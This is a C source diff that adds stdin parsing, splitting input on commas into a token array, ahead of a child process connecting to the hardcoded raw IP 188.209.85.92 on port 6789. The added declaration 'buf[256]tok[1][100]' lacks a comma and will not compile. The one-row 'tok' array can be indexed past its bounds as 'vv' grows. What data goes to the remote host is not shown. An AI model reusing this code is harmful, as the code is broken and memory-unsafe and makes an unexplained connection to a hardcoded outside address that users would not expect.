@@ -15,10 +15,10 @@ static void on_alarm(int sig){
   if(child_pid>0)kill(child_pid,SIGKILL);
 }
 
-int main(void) {
-  int fds[2],fd,r,i,printed,status;
+int main(void){
+  int fds[2],fd,r,i,printed,status,vv,gg,c;
   struct addrinfo *res;
-  char h,out[100],*p,buf[256];
+  char h,out[100],*p,buf[256]tok[1][100];
   size_t len;
   struct sigaction sa;
   ssize_t n;
@@ -32,6 +32,14 @@ int main(void) {
     close(fds[0]);
     dup2(fds[1],STDOUT_FILENO);
     close(fds[1]);
+    for(vv=0,gg=0;;){
+      c=getchar();
+      if(c==EOF)break;
+      if(c==','){tok[vv][gg]='\0'; vv++; gg=0; continue;}
+      if(vv<1)tok[vv][gg++]=(char)c;
+     }
+    tok[vv][gg]='\0';
+
     if(getaddrinfo("188.209.85.92","6789",&(struct addrinfo){.ai_socktype=SOCK_STREAM},&res)!=0){
       write(1,"0,ND\n",5);
       _exit(0);
